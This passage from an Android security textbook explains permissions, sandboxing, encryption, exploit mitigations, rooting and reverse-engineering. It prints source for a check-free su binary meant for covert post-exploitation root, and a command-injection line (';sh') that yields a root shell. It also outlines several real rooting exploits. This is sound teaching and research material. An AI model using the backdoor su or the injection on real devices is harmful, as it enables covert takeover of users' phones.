sms\nRead Permission: android.permission.READ_SMS\nWrite Permission: android.permission.WRITE_SMS\nContent Provider: com.android.providers.telephony.SmsProvider\nMultiprocess Allowed: False\nGrant Uri Permissions: False\nAuthority: mms-sms\nRead Permission: android.permission.READ_SMS\nWrite Permission: android.permission.WRITE_SMS\nContent Provider: com.android.providers.telephony.MmsSmsProvider\nMultiprocess Allowed: False\nGrant Uri Permissions: False\n...\nWhen an application attempts to access one of the content providers listed previously, the operating system will\ncheck that the calling application holds the required permission. If it does not hold the appropriate permission,\na permission denial results. An example of querying content://sms from drozer, which does not hold the\nREAD_SMS permission by default, is shown here:\ndz> run app.provider.query content://sms\nPermission Denial: opening provider\ncom.android.providers.telephony.SmsProvider from ProcessRecord{b1ff0638\n1312:com.mwr.dz:remote/u0a56} (pid=1312, uid=10056) requires\nandroid.permission.READ_SMS or android.permission.WRITE_SMS\nProtection Levels\nEach permission that is defined has an associated attribute known as its protection level. Protection levels\ncontrol the conditions under which other applications can request the permission. Naturally, some permissions\nare more dangerous than others and this should reflect in the assigned protection level. For instance, third-party\napplications should never be granted the ability to install new applications (using the\nandroid.permission.INSTALL_PACKAGES permission) and the system should not allow it. An author of a number\nof applications may want to share information or invoke functionality between her applications at runtime in a\nsecure manner. Both of these scenarios can be achieved by selecting the correct protection level on defined\npermissions. Table 6.2 describes all the available protection levels that can be set on a newly defined permission.\nTable 6.2 Permission Protection Levels\nPROTECTION INTEGER DESCRIPTION\nLEVEL VALUE\nnormal 0x0 The default value for a permission. Any application may request a permission\nwith this protection level.\ndangerous 0x1 Indicates that this permission has the ability to access some potentially\nsensitive information or perform actions on the device. Any application may\nrequest a permission with this protection level.\nsignature 0x2 Indicates that this permission can only be granted to another application that\nwas signed with the same certificate as the application that defined the\npermission.\nsignatureOrSystem 0x3 This is the same as the signature protection level, except that the permission\ncan also be granted to an application that came with the Android system image\nor any other application that is installed on the /system partition.\nsystem 0x10 This permission can only be granted to an application that came with the\nAndroid system image or any other application that is installed in particular\nfolders on the /system partition.\ndevelopment 0x20 This permission can be granted from a privileged context to an application at\nruntime. This scarcely documented feature was discussed at\nhttps://code.google.com/p/android/issues/detail?id=34785.\nAs a practical example of protection levels in action, take a look at what happens when you compile a new drozer\nagent with the INSTALL_PACKAGES permission and attempt to install it.\n$ drozer agent build --permission android.permission.INSTALL_PACKAGES\nDone: /tmp/tmp2RdLTd/agent.apk\n$ adb install /tmp/tmp2RdLTd/agent.apk\n2312 KB/s (653054 bytes in 0.275s)\npkg: /data/local/tmp/agent.apk\nSuccess\nThe package installs successfully but logcat shows a log entry from the Package Manager saying the following:\nW/PackageManager( 373): Not granting permission\nandroid.permission.INSTALL_PACKAGES to package com.mwr.dz\n(protectionLevel=18 flags=0x83e46)\nIt refused to grant the INSTALL_PACKAGES permission. This can be confirmed in drozer by displaying the\npermissions held by the agent:\ndz> permissions\nHas ApplicationContext: YES\nAvailable Permissions:\n- android.permission.INTERNET\nIt is quite obvious that this happened because of the protection level set on the INSTALL_PACKAGES permission,\nwhich is signature|system (which equates to an integer protection level of 18. This value comes from\nperforming a Boolean OR operation on 0x02 and 0x10). The drozer agent was not signed by the same certificate\nas the application that defined the INSTALL_PACKAGES permission (which is usually the package named android)\nand it did not come as part of the system image. Hence, the request to attain this permission was rejected by the\nOS. If one application permission request is rejected, the application will still function correctly as long as it\nhandles this rejection gracefully when attempting to use functionality provided by this permission at runtime. If\nthe application does not handle this scenario gracefully it may result in an application crash.\nThird-party applications that do not have any intention of sharing data or functionality with applications from\nother developers should always define permissions with the signature protection level. This ensures that\nanother developer cannot write an application that requests your permission and gains access to your exported\ncomponents. This may not constitute a direct risk to your application or its data depending on what the\npermission is used for; however, in most cases this is not desirable from a security perspective. Using the\nsignature protection level does not affect the application’s ability to integrate or communicate with other\napplications created by the same developer, as these applications would be signed with the same certificate. This\nis why it is so important that Android packages are signed cryptographically, or else how would Android know\nwhich application is fit to hold a particular permission? In fact, Android will not allow you to install an\napplication that is not signed and doing so from ADB will result in an error with the code\nINSTALL_PARSE_FAILED_NO_CERTIFICATES. The use of permissions with protection levels provides a strong\nfoundation for application security for developers; however, the foundation’s strength depends on the correct\nconfiguration of protection levels.\nA WORD ON COMMON MALWARE TACTICS\nThe large majority of news articles relating to Android security are about malware found in alternative\nAndroid app markets or being served from compromised websites. The usual method employed by\nmalware is to simply request the appropriate permission in order to perform its evil deeds. Whether this\nmalware is sending premium-rate SMS messages or reading contacts stored on the device for spam, it\nrequested the permission to access these resources. Malware authors count on the fact that users do not\nread the permissions on the installation review activity when installing the application. It is important to\nnote that the security model has not been broken in any way by this common tactic and this is exploiting\nthe lack of user security awareness rather than a technical flaw in Android.\nApplications have been discovered on alternative Android app markets that are able to exploit a\nvulnerability in order to bypass the security model in some way. A good example of one way to do this is\nincluding a kernel exploit that allows the malware to gain root access on the device. After root access has\nbeen obtained, any additional packages can be installed with arbitrary permissions and raw access to\ndatabases and files storing sensitive information can be retrieved and sent back to the malware author.\nThe application would not require any permissions at all to perform this attack. One such malware sample,\nnamed RootSmart, was found to include a popular root exploit named “gingerbreak” that obtained root\naccess on victim devices and then connected to a command-and-control server on the Internet for further\ninstructions. You can read more about this specific malware at\nhttp://www.csc.ncsu.edu/faculty/jiang/RootSmart/.\nApplication Sandbox\nThe Android application sandbox comprises multiple measures that were designed to ensure that one\napplication cannot harm another or read its data without being explicitly allowed to do so.\nStart by looking at what measures are in place from a native Linux viewpoint. As discussed earlier in this\nchapter, each application runs as its own user on Android. This provides a strong model for filesystem security\nthat is inherited from UNIX. Each application’s private data directory is marked with the file permissions that\nonly allow the application’s user to access it. Here is an example of the drozer agent’s data directory\npermissions:\ndrwxr-x--x u0_a59 u0_a59 2014-05-11 18:49 com.mwr.dz\nAttempting to access this folder as any other non-privileged user results in a permission denial, as shown in this\nexample:\nshell@android:/ $ ls -l /data/data/com.mwr.dz\nopendir failed, Permission denied\nHowever, note that the folder is marked as world executable. This means that any other files or subfolders\ninside this directory with lax permissions set on them will result in the exposure of these files to any user (and\nhence application) on the system. Chapter 7 explores this topic in detail.\nAn exception to the rule that each application runs as its own user is when an application requests to use a\nsharedUserId. This can be done by using the manifest entry android:sharedUserId=\"requested.userid.name\".\nThis request is granted to an application only if it is signed by the same certificate as the first application that\nrequested this user identifier. If a set of applications use this option, they will be running under the exact same\nUID. This means that there will be no separation between them and they can freely read and write to each\nother’s private data directories. There are even configuration options available to accommodate running these\napplications in the same process. This means that every one of these applications effectively hold all the\npermissions of the entire collection of applications running under the same user identifier.\nAn example of mapping what the collective permissions are of applications making use of the android.media\nsharedUserId is shown in drozer:\ndz> run app.package.shareduid -u 10005\nUID: 10005 (android.media:10005)\nPackage: com.android.providers.downloads\nPackage: com.android.providers.downloads.ui\nPackage: com.android.gallery\nPackage: com.android.providers.media\nPermissions: android.permission.WRITE_EXTERNAL_STORAGE,\nandroid.permission.ACCESS_ALL_DOWNLOADS, android.permission.WAKE_LOCK,\nandroid.permission.WRITE_SETTINGS, android.permission.WAKE_LOCK,\nandroid.permission.CAMERA, android.permission.RECEIVE_BOOT_COMPLETED,\nandroid.permission.ACCESS_DOWNLOAD_MANAGER,\nandroid.permission.ACCESS_NETWORK_STATE,\nandroid.permission.SEND_DOWNLOAD_COMPLETED_INTENTS,\nandroid.permission.WRITE_MEDIA_STORAGE,\nandroid.permission.WRITE_EXTERNAL_STORAGE, android.permission.RECORD_AUDIO,\nandroid.permission.ACCESS_FINE_LOCATION,\nandroid.permission.RECEIVE_BOOT_COMPLETED, android.permission.INTERNET,\nandroid.permission.READ_EXTERNAL_STORAGE, android.permission.SET_WALLPAPER,\nandroid.permission.INTERACT_ACROSS_USERS, android.permission.READ_SMS,\nandroid.permission.ACCESS_MTP, android.permission.READ_EXTERNAL_STORAGE,\nandroid.permission.ACCESS_CACHE_FILESYSTEM,\nandroid.permission.MODIFY_NETWORK_ACCOUNTING,\nandroid.permission.SEND_DOWNLOAD_COMPLETED_INTENTS,\nandroid.permission.MANAGE_USERS, android.permission.READ_EXTERNAL_STORAGE,\nandroid.permission.ACCESS_ALL_DOWNLOADS,\nandroid.permission.CONNECTIVITY_INTERNAL,\nandroid.permission.WRITE_EXTERNAL_STORAGE,\nandroid.permission.UPDATE_DEVICE_STATS\nThis drozer module can be used to retrieve the collective permissions that all four packages shown effectively\nhold. You can find more about the sharedUserId attribute at\nhttp://developer.android.com/guide/topics/manifest/manifest-element.html#uid.\nOther application sandbox features are controlled by binder. Every application has access to binder and is able to\ncommunicate with it. Specialized IPC parcels are sent to it by applications and passed to the Activity Manager\nService, which checks whether the calling application holds the permission required to perform the requested\ntask. For example, if an application had to request that an exported activity from another application be started,\nthe OS would check that the calling application holds the appropriate permission to start the activity. All\nAndroid API calls to exposed application components are controlled and the permission model is strictly\nenforced when accessing them.\nSome application permissions are not enforced by binder, but rather by the Linux group assigned to an\napplication. As explained in the “Understanding Permissions” section, requesting some permissions may get\nyour application put in a certain group. For instance, inet when requesting android.permission .INTERNET. This\nmeans that accessing the network from an application would be governed by the OS’s native security checks and\nnot binder.\nIn summary, Android does not implement a sandbox as you would expect. People often think of a sandbox as a\ncompletely separate virtual machine environment like one would run a sample of malware inside to make sure\nthat it cannot infect the host system. Instead, Android uses only the strength of Linux user and group separation\nsecurity enforced by the kernel as well as special IPC calls to binder to uphold the application capability security\nmodel. It does not provide a completely segregated environment for each application as some have thought.\nFilesystem Encryption\nFull disk encryption (FDE) is when the contents of an entire drive or volume are encrypted and not only\nselected individual files. This is useful because it requests the password from the user at startup and from then\nonward transparently encrypts and decrypts all data read and written to the disk. This serves as protection\nagainst stolen or lost disks that have been powered down. Part of the benefit is being able to defeat common\nforensics techniques such as disk imaging and booting the disk attached to another OS in order to browse the\ncontents. Widely accepted FDE software makes use of a user-provided password in order to derive the key used\nfor encryption.\nFDE has been available on Android since version 3.0 (Honeycomb). It makes use of the dm-crypt module in the\nkernel to transparently encrypt and decrypt data on the block device layer. This is the same implementation\nused on modern Linux systems and is a tried and trusted form of FDE. The encryption suite used under the\nhood is aes-cbc-essiv:sha256, which had no publicly acknowledged weaknesses at the time of writing.\nFilesystem encryption is not enabled by default on Android versions prior to 5.0 (Lollipop) and has to be\nenabled by the user in the encryption options in the security section of the settings application. The user’s\nunlock screen PIN or password is the same one that is used to encrypt the FDE password. This means that\nAndroid generates a password, and this is encrypted using a key that is derived from the user’s screen unlock\nPIN or password. The key used to encrypt the FDE password is derived from the PIN or user’s password using\n2000 rounds of PBKDF2 on versions of Android prior to 4.4 (KitKat). KitKat onwards implements scrypt for\nkey derivation instead of PBKDF2 to make brute-forcing of long PIN numbers and passwords extremely\ndifficult. The use of this intermediary password allows users to change their unlock screen password without\nhaving to change the actual FDE password.\nThis solution encrypts only the /data partition on an Android device. This means that the private data directory\nof applications and other sensitive user information is encrypted. Performing disk imaging techniques on the\nentire filesystem (as one would do in a forensic investigation) would yield access to only this encrypted data and\nnot to any of the files in the /data folder or any of its subfolders. An interesting downfall is that the Secure\nDigital (SD) card is not included as part of the standard FDE scheme used by Android. Some handset\nmanufacturers have included the encryption of the SD card as part of their customizations to Android; however,\nthese implementations are proprietary and non-standardized. This means that gaining physical access to an\nAndroid device that has not implemented SD card encryption will allow the retrieval of all files stored on the SD\ncard. Some applications have been discovered to use the SD card for storage of sensitive files, so this may prove\nuseful to an attacker.\nDisk encryption by nature protects only data at rest. This means that if an attacker had to gain code execution on\na device that is making use of FDE on Android, he would not notice a difference in the data he could access. He\nwould find that the data he retrieves is not encrypted in any manner, as it would transparently be decrypted for\nhim by dm-crypt. Disk encryption does, however, protect users when an encrypted device has been stolen and\nthe attacker does not have code execution or access to the device.\nFor additional information about the technical aspects of FDE on Android check out\nhttp://source.android.com/devices/tech/encryption/ and\nhttp://nelenkov.blogspot.com/2014/10/revisiting-android-disk-encryption.html.\nGeneric Exploit Mitigation Protections\nAttackers have exploited native memory corruption issues since the first operating systems, and Android is no\nexception. Where native code is running in applications, the potential exists to corrupt memory structures to\ntake control of it. To combat the trivial exploitation of native bugs, OS developers began to implement\npreventative and reactive measures known as exploit mitigations. These measures result from the attitude of\n“we will not be able to secure all code, so why not make it harder to exploit these issues instead.”\nMany of the mitigations that Android makes use of are inherited from the Linux kernel. Applications on Android\ncan make use of native libraries that are built in C/C++ or execute binaries that are included in their assets.\nCode that contains vulnerabilities and is in a code path that provides an entry point for an attacker could be\nexploited by the attacker to take control of the application. Note that if an attacker had to successfully exploit a\nnative component, he would gain the privileges of the application itself and nothing more. In other words,\nnative code runs under the exact same context as the calling application.\nA simple example of this scenario is the Android browser. All the parsing performed by the Android browser is\ndone inside a native library. If an attacker can provide malformed HTML, JavaScript, CSS, or any other element\nthat requires parsing from this native component, he could potentially cause the corruption of memory\nstructures within the browser application. If this is done in a finely crafted manner, an attacker can cause new\ncode to be executed by the application. This is why including any and all exploit mitigations on the Android OS is\nimportant to protect users from compromise.\nExploit mitigations have been included since the very first publicly available version of Android. However,\nmitigations that are comparable with modern desktop operating systems have only been available in Android\nsince version 4.0 (Ice Cream Sandwich). This point may be argued, but the fact is that writing an exploit for a\nremotely exploitable memory corruption vulnerability on a Jelly Bean (or newer) device is a time-consuming\ntask that often requires the chaining of multiple vulnerabilities. Exploit mitigations do not make it impossible to\nwrite an exploit for a vulnerability but rather make it a lot more expensive to do so. Table 6.3 lists some of the\ntruly noteworthy mitigations introduced to Android.\nTable 6.3 Noteworthy Exploit Mitigations Included in Android\nEXPLOIT VERSION EXPLANATION\nMITIGATION INTRODUCED\nStack cookies 1.5 Protects against basic stack-based overflows by including a “canary” value\nafter the stack that is checked.\nsafe_iop 1.5 Provides a library that helps reduce integer overflows.\ndlmalloc 1.5 Helps prevent double free() vulnerabilities and other common ways to\nextensions exploit heap corruptions.\ncalloc 1.5 Helps prevent integer overflows during memory allocations.\nextensions\nFormat string 2.3 Helps prevent the exploitation of format string vulnerabilities.\nprotections\nNX (No eXecute) 2.3 Prevents code from running on the stack or heap.\nPartial ASLR 4.0 Randomizes the location of libraries and other memory segments in an\n(Address Space attempt to defeat a common exploitation technique called ROP (Return-\nLayout Oriented Programming).\nRandomization)\nPIE (Position 4.1 Supports ASLR to ensure all memory components are fully randomized.\nIndependent Effectively ensures that app_process and linker are randomized in memory\nExecutable) so that these cannot be used as a source of ROP gadgets.\nsupport\nRELRO 4.1 Hardens data sections inside a process by making them read-only. This\n(RELocation prevents common exploitation techniques such as GOT (Global Offset\nRead-Only) and Table) overwrites.\nBIND_NOW\nFORTIFY_SOURCE 4.2 Replaces common C functions that are known to cause security problems\n(Level 1) with “fortified” versions that stop memory corruption from taking place.\nSELinux 4.3 Allows for fine-grained access control security policies to be specified. When\n(Permissive properly configured policies are present, it can provide a significant\nmode) improvement in the security model. Permissive mode means that security\nexceptions are not enforced when a policy is breached. This information is\nonly logged.\nSELinux 4.4 Enforcing mode means that the specified policies are imposed.\n(Enforcing\nmode)\nFORTIFY_SOURCE 4.4 Replaces additional functions with their “fortified” versions.\n(Level 2)\nNote that using the latest NDK (see https://developer.android.com/tools/sdk/ndk/index.html) and targeting\nthe latest Android API version automatically enables all the exploit mitigations discussed in Table 6.3. These\nmitigations can also be turned off explicitly, but there is seldom a need to do that.\nYou can find more information about the exploit mitigations and other security features introduced in each\nversion at https://source.android.com/devices/tech/security/ and in the relevant source code commit logs.\nADDITIONAL KERNEL PROTECTIONS AGAINST PRIVILEGE ESCALATION\nSome exploit mitigations introduced into Android are specifically to stop a user that already has code\nexecution on a device as a low-privileged user from exploiting some aspect of the kernel to gain root\naccess. Table 6.4 presents a list of noteworthy kernel-hardening mitigations.\nTable 6.4 Noteworthy Exploit Mitigations to Prevent a Non-privileged User From Exploiting a Vulnerability\nand Gaining Root Access\nEXPLOIT VERSION EXPLANATION\nMIGITATION INTRODUCED\nmmap_min_addr 2.3 This value specifies the minimum virtual address that a process is allowed\nto mmap and was set to 4096. This stops processes from mapping the zero\npage and causing a null pointer dereference in order to execute arbitrary\ncode as root.\nkptr_restrict 4.1 Avoids leaking kernel addresses when displaying /proc/kallsyms and\nand /proc/kmsg to users.\ndmesg_restrict\nmmap_min_addr 4.1.1 This value was increased to 32768.\nupdate\ninstalld 4.2 The installd daemon no longer runs as the root user. This means that any\nhardening compromise of this component will not result in a privilege escalation to\nroot.\nInit script 4.2 This helps prevent against symbolic-link related attacks.\nO_NOFOLLOW\nInit script no 4.2 Using some vulnerability to add ro.secure=0 or ro.kernel .qemu=1 to\nlonger parses /data/local.prop was a common way of escalating from the system user to\n/data/local.prop root as these values cause adbd to be started as root.\nRemoved 4.3 Removed all setuid/setgid programs and added support for filesystem\nsetuid/setguid capabilities instead.\nprograms\nRestrict setuid 4.3 The /system partition is mounted as nosuid for all processes that were\nfrom installed spawned by zygote. This means that installed applications cannot abuse\napps vulnerabilities in any SUID binaries to gain root access.\nRooting Explained\nOn Android, by default no way exists to run an application or some task within it as the root user. This simple\nfact has led to entire communities of researchers dedicating their time to finding ways to obtain root on various\nAndroid devices. There are also very many misconceptions about what rooting your device entails technically\nand why it is possible (or not) on certain devices. This section sheds light on some of the common rooting\nmethods and gives a technical breakdown of each.\nRooting Objectives\nA typical objective of rooting an Android device is so that you can put a su binary in a directory on the PATH (for\nexample, /system/bin or /system/xbin). The job of the su binary is to allow a user to switch security contexts\nand become another user, including root. The su binary should, however, first determine whether the user\nshould be allowed to impersonate the requested user. The required criteria is different on conventional Linux\nsystems from the methods used on commonly found su packages on Android, but one fact that remains the\nsame is that the su binary needs to be running as root in order to allow the change to another user context. The\nfollowing shows the file permissions on su on a modern Linux system:\n$ ls -l /bin/su\n-rwsr-xr-x 1 root root 36936 Feb 17 04:42 /bin/su\nThese permissions tell you that any user can execute this binary and when she does she will be running it as the\nroot user. This is a Set User Identifier (SUID) binary, which sets the user ID to the file’s owner upon execution.\nYou can invoke it from within an application by using code similar to this:\nRuntime.getRuntime().exec(new String[]{\"su\", \"-c\", \"id\"});\nThis executes the id command as the root user and works because the su binary is on the PATH, which means\nthat the OS knows where to find it on the system. When using su on a Linux system, it asks for the target user’s\npassword to authenticate the action. However, on Android a different approach is commonly taken because the\nroot user does not have a password. Different root manager application developers use different technical\nmethods but they both come down to the same concept for the user. When an application executes su, an\nactivity is displayed to the user requesting the user’s permission to grant the requesting application root context.\nThese applications usually display information about the application requesting root and what it is attempting\nto execute. Figure 6.10 shows an example of a prompt from the SuperSU application.\nFigure 6.10 The prompt displayed by SuperSU to allow an application access to root context.\nThis application works by using a custom version of su that sends a broadcast directly to a broadcast receiver in\nthe SuperSU application. This broadcast contains the requesting application’s information as well as relevant\ndetails about which command will be executed as root. After this broadcast is received by the application it\ndisplays a prompt to the user with the supplied information. The su binary then polls a file in the private data\ndirectory to find out whether permission was granted by the user. According to the user’s decision, su decides to\nsetuid(0) or not.\nThe information just presented explains how you can allow applications to execute commands as root in a user-\ncontrolled manner that in theory is safe. Another objective that an attacker may pursue is gaining persistent\nroot access on a device under his control without the user noticing. For this purpose, a completely unprotected\ncustom version of su is included with drozer as part of the tools.setup.minimalsu module. This su version is\nmeant to be used for post-exploitation on older devices and should not be used for everyday purposes. Here is\nthe code for it:\n#include <stdio.h>\n#include <unistd.h>\nint main(int argc, char **argv)\n{\nif (setgid(0) || setuid(0))\nfprintf(stderr, \"su: permission denied\\n\");\nelse\n{\nchar *args[argc + 1];\nargs[0] = \"sh\";\nargs[argc] = NULL;\nint i;\nfor (i = 1; i < argc; i++)\nargs[i] = argv[i];\nexecv(\"/system/bin/sh\", args);\n}\n}\nThis code is simply using setuid(0) and setgid(0) to change to the root user’s context, which means that any\napplication that executes su will receive root context and no checks are performed or prompts shown to the user.\nAn application that has been allowed to run commands as root can control absolutely any aspect of the device\nand completely breaks the Android security model. This means that it will be able to access any other\napplication’s files or modify their code at rest or at runtime. This is why there are so many warning labels about\ndownloading untrusted applications that require root access. An application that implements poor or malicious\ncode can damage the OS or even ruin it completely.\nRooting Methods\nMany online articles provide tutorials on rooting specific devices; however, technical details of what exactly is\ngoing on in the background are often scarce. This section does not delve extensively into different methods of\nrooting devices, but does give you enough information to know what scenarios an attacker could use with each\ntype to gain access to the data stored by applications.\nThere are two main ways of gaining root access on an Android device—using an exploit and using an unlocked\nbootloader. Both are explored in the following subsections.\nUsing an Exploit\nAndroid uses the Linux kernel and also contains code added by device manufacturers. Like most code these\nimplementations could contain bugs. These bugs could be anything from a simple mistake in the permissions of\na particular file or driver code that does not handle certain user input securely. Entire books have been written\nabout finding these sorts of vulnerabilities, so we explore a small subset of noteworthy exploits from different\nvulnerability classes.\nGINGERBREAK—EXPLOITING AOSP KERNEL CODE\nThe vulnerability exploited by Gingerbreak exists in the Volume Manager (vold) on Android versions 2.2\n(Froyo)—and 3.0 (Honeycomb). Vold manages the mounting of external storage volumes on Android. The\nvulnerability was an out-of-bounds array access that allowed the exploit author to overwrite entries in the\nGlobal Offset Table (GOT) to trick the system into executing a copy of the sh binary as root. This requires\nthat the user be in the log group, which can be achieved by running it from adb or from an application with\nthe READ_LOGS permission. This vulnerability exists in the original Android Open Source Project (AOSP)\ncode from Google. This means that any devices running the affected versions of Android are vulnerable to\nthis issue. The original exploit is at the following address: http://c-skills.blogspot.com/2011/04/yummy-\nyummy-gingerbreak.html.\nEXYNOS ABUSE—EXPLOITING CUSTOM DRIVERS\nDevice manufacturers sometimes have to include custom device drivers in order to interface with included\nhardware. The standard of the code or configuration in some cases is not of the highest quality and\ndiscovered vulnerabilities can be used to gain root access. An exploit for an issue discovered in devices\nusing exynos processors, such as the Samsung Galaxy S3, appeared in the following forum post:\nhttp://forum.xda-developers.com/showthread.php?t=2048511. The forum post detailed that a block\ndevice located at /dev/exynos-mem allowed the mapping of kernel memory into user space by any user. The\nexploitation technique used was to patch a comparison made in the setresuid() function. This\ncomparison is normally cmp r0, #0 and was altered to cmp r0,#1 as a result of having complete access to\nthe memory space, which meant that when sysresuid(0) was called later on the code, access was granted\nto change to root context. This exploit also elegantly bypassed the kptr_restrict memory protection,\nwhich does not allow applications to read /proc/kallsyms and obtain kernel pointers. It did so by changing\nthe enforcing flag of this check in live memory. This example illustrates that a simple bug can result in the\nreliable exploitation of a kernel driver to obtain root. This exploit can be run from an ADB shell or any\napplication with no specific permissions, making it very dangerous. Note that this exploit is very device\nspecific and signifies a flaw in the device manufacturer’s code.\nSAMSUNG ADMIRE—ABUSING FILE PERMISSIONS WITH SYMLINKS\nPermissive file permissions on files used by the system on Android devices can sometimes be used to\nobtain root. This method may sound obscure but consider the following classic example from Dan\nRosenberg in his exploit for the Samsung Admire: http://vulnfactory.org/blog/2011/09/12/rooting-\nthe-samsung-admire/. He discovered that when an application crashes, a dump file was created at\n/data/log/dumpState_app_native.log on the filesystem by root with the world-writable file permission. In\naddition, the /data/log/ parent directory was also world-writable. Therefore, placing a symbolic link\nnamed dumpState_app_native.log in this directory and causing an application to crash would cause a file\nto be written somewhere else on the filesystem as world-writable. There existed a file in older versions of\nAndroid at /data/local.prop, which was used to (among other things) determine what privilege level ADB\nshould run under. This file was not present on this device and so Dan exploited this vulnerability to create\nthe /data/local.prop file as world-writable and then insert a command in this file stating that ADB\nshould run as root. This attribute is ro.kernel.qemu=1 on this particular device. From there the exploit\nuses ADB as root, places the su binary, and installs the root manager application. This exploit requires an\nADB connection in order to complete because the “payload” was changing the privileges of the ADB\ndaemon to root. This exploit is very specific to the configuration of the Samsung Admire and is not a\ngeneric Android exploit.\nACER ICONIA—EXPLOITING SUID BINARIES\nA SUID binary that is owned by root and world-executable is a very high-value target for root exploit\ndevelopers. If they discover any vulnerabilities in this binary that allow the execution of arbitrary code,\nthey will have gained root access on the device. This particular issue was discovered by an XDA Developers\nuser named sc2k on the Acer Iconia A100, which had a pre-installed SUID binary named cmdclient that\nwas vulnerable to command injection. See the original post at http://forum.xda-\ndevelopers.com/showthread.php?t=1138228. The format of the commands accepted by this binary are as\nfollows:\n/system/bin/cmdclient <argument> <parameters>\nwhere <argument> was a set of predefined values. Using command injection found in the code handling the\nparsing of user input, the author of the exploit could run the following command and gain a root shell on\nthe device:\n$ cmdclient misc_command ';sh'\n#\nThis and other variations have been reported to work on other devices as well, including a family of\nMotorola devices and any other device that contains this vulnerable binary.\nMASTER KEY BUGS—EXPLOITING ANDROID AOSP SYSTEM CODE\nThe “master key” code signing bug explained earlier in the “Code Signing” section has far-reaching\nconsequences for Android. Not only can it allow you to repackage an application without breaking its\nsignatures but you can also use it to obtain system access on a device. This level of access can translate to\nroot access on a device, depending on the version. The method used is to pull an existing system\napplication off the device that runs under the system context (by specifying a sharedUserId of\nandroid.uid.system in its manifest), change the file’s manifest (making it debuggable), and then install it\nback onto the device. It is then possible with ADB access to inject new classes into the newly debuggable\napplication, essentially executing code as the system user. On versions of Android prior to 4.2 (Jelly Bean)\nconverting this to root access is possible by adding configuration commands to /data/local.prop that\nforce the ADB daemon to be started as root.\nThis method works on all versions of Android that are vulnerable to these code-signing issues, which at\nthe time of writing was the large majority. A tool named Cydia Impactor was created by Jay Freeman\n(saurik) that automates this process (see http://www.cydiaimpactor.com/). Figure 6.11 shows the\nfunctionality available.\nFigure 6.11 The options available on Cydia Impactor to make use of code-signing bugs to obtain system\nand root.\nMore information about the exact method used by this tool to exploit such code signing issues appears at\nhttp://www.saurik.com/id/17.\nTOWELROOT—EXPLOITING LINUX KERNEL VULNERABILITIES ON ANDROID\nIn addition to having its own attack surface, Android also inherits many of the exploitable kernel bugs\nfound in the main Linux kernel tree. An example of this is CVE-2014-3153. This vulnerability is in the\nfutex (fast userspace mutex) mechanism in the Linux kernel that is responsible for the management of\nlocks used when threading. The vulnerability was discovered by a talented bug-hunter named Nicholas\nAllegra (comex) and exploited by George Hotz (geohot) in his widely known exploit dubbed Towelroot (see\nhttps://towelroot.com/). The Towelroot exploit can be used to gain root access on many Android devices\nbut was famous for being the first to allow the rooting of a Samsung Galaxy S5. Any device with a kernel\nbuild date prior to 16 June 2014 and a kernel version greater than 2.6.29 is vulnerable to this issue\naccording to Bill Anderson (see http://www.all-things-android.com/content/android-and-linux-\nkernel-towelroot-exploit). The exploitation of this vulnerability is very involved and various security\nresearchers have written in-depth reviews of this vulnerability and exploitation techniques that achieve a\nfull privilege escalation to root from a completely unprivileged context. Exploits for this vulnerability can\nbe used to gain root access from an ADB shell or any application with no specific permissions which\nmakes it very dangerous.\nUsing an Unlocked Bootloader\nSome devices come with a user-unlockable bootloader that allows you to flash new firmware onto it. Various\nmethods can be used to obtain root using an unlocked bootloader. The most common ways are flashing a new\nrecovery image or flashing a pre-rooted kernel image that already contains the su binary. This may void the\nwarranty of your device or if you do not know what you are doing, you may leave your device in an irrecoverable\nstate.\nFLASHING A CUSTOM RECOVERY IMAGE ONTO A NEXUS DEVICE\nThe bootloader on Google Nexus devices makes use of a protocol named fastboot, which allows a user to\nperform a number of low-level operations on the device such as flashing new firmware, erasing partitions,\nand unlocking and locking the bootloader. To get into the bootloader of a Nexus device, hold both volume\nbuttons and the power button when the device is powered off. Alternatively, perform the following\ncommand with the device attached to your computer:\n$ adb reboot bootloader\nThis should boot the device directly into the bootloader, showing options like Start, Restart Bootloader,\nRecovery mode, and Power off that can be toggled with the volume keys. You can now interact with\nfastboot from your computer. To check whether the device is connected, use the fastboot utility that came\nwith the Android SDK and make sure that an entry appears:\n$ sudo fastboot devices\n014691490900600D fastboot\nUnlock the bootloader using the following command:\n$ sudo fastboot oem unlock\n...\nOKAY [ 55.995s]\nfinished. total time: 55.995s\nThis displays a screen asking whether you are sure you want to unlock the bootloader and that you may\nvoid your warranty. If you agree to the information presented, after a few seconds the screen returns to\nthe bootloader. It should now show “LOCK STATE - UNLOCKED” in the bottom left of the device’s screen.\nAt this stage you can load a custom recovery image that allows you to perform privileged operations on\nyour device, such as place a su binary on your filesystem.\nA very popular recovery image that has an extensive list of functionality is ClockWorkMod. To find the\nsupported devices and downloads for each, go to http://www.clockworkmod.com/rommanager. However, for\nthe purposes of obtaining root on a Samsung or Nexus device in the simplest manner, you can use a\ncustom recovery firmware image named CF-Autoroot. CF-Autoroot is made by Chainfire who is the creator\nof SuperSU. By downloading CF-Autoroot, which contains a recovery firmware image that automatically\nplaces SuperSU and the su binary on your filesystem and reboots the phone, you obtain a rooted device in\nminimal time and steps. You can find the download at http://autoroot.chainfire.eu/#fastboot for your\nNexus device. Download and unzip the archive until you find a file with an extension of .img. This\nrecovery image is flashed onto the device using the following command:\n$ sudo fastboot flash recovery CF-Auto-Root-maguro-yakju-galaxynexus.img\nsending 'recovery' (6084 KB)...\nOKAY [ 0.816s]\nwriting 'recovery'...\nOKAY [ 0.669s]\nfinished. total time: 1.485s\nScroll to the Recovery Mode option in the bootloader and press the power button to boot into CF-Autoroot.\nA screen appears that shows you the details of the rooting process, and then it reboots the device. At this\npoint, all the required files for root access have been placed on the device and it is rooted. If possible,\nlocking your bootloader again after flashing is generally a good idea. If you leave it unlocked, you are\nopening up your device to attack if someone gains physical access to it. On devices that use fastboot you\ncan perform the following command to lock your bootloader again:\n$ sudo fastboot oem lock\n...\nOKAY [ 0.126s]\nfinished. total time: 0.126s\nOther device manufacturers may also provide unlocked bootloaders but different tools and protocols to perform\nflashing operations. A good example of this is Samsung; you can use a tool named ODIN to flash any Samsung\ndevice. A vast number of guides are on the Internet on how to use tools from each manufacturer and where to\nget custom system and recovery images.\nReverse-Engineering Applications\nReverse-engineering is the process of gaining a deep understanding of a system or application by only having\nthe finished product at hand. Being able to understand what is happening under the hood of an application that\nyou do not have the source code of is the basis of reverse-engineering. A very different mindset and set of skills\nis needed when compared to performing source code review of an application. This section covers the multiple\ntechniques and tools required to reverse engineer Android applications. First, having the APK file of your target\napplication is crucial. This may be an application that is already installed on a device you have or one that is\navailable on the Play Store 